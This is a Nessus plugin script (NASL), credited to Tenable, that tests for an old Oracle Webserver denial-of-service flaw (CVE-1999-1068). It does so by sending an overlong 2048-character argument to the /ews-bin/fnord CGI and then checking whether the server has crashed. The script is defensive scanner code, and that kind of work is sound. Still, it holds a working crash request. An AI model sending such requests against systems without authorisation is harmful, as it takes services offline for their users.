#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if(description)
{
 script_id(10171);
 script_version ("$Revision: 1.28 $");

 script_cve_id("CVE-1999-1068");
 script_xref(name:"OSVDB", value:"9413");

 script_name(english:"Oracle Webserver PL/SQL Stored Procedure GET Request DoS");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote host has an application that is affected by denial
of service vulnerability." );
 script_set_attribute(attribute:"description", value:
"It was possible to make the remote web server crash by 
supplying a too long argument to the cgi /ews-bin/fnord. 
An attacker may use this flaw to prevent your customers 
to access your web site." );
 script_set_attribute(attribute:"solution", value:
"Remove this CGI." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N" );

 script_end_attributes();
 
 script_summary(english:"Crashes the remote OWS");
 script_category(ACT_DENIAL);
 script_copyright(english:"This script is Copyright (C) 1999-2009 Tenable Network Security, Inc.");
 script_family(english:"Databases");
 script_dependencie("http_version.nasl", "find_service1.nasl", "no404.nasl");
 script_require_ports("Services/www", 80);
 exit(0);
}

#
# The script code starts here
#

include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");

if (report_paranoia < 2) exit(0);

port = get_http_port(default:80);

res = is_cgi_installed_ka(item:"/ews-bin/fnord", port:port);
if(res)
{
  request = string("/ews-bin/fnord?foo=", crap(2048));
  is_cgi_installed_ka(item:request, port:port);
  sleep(5);
  soc = open_sock_tcp(port);
  if(!soc)security_warning(port);
  else close(soc);
}

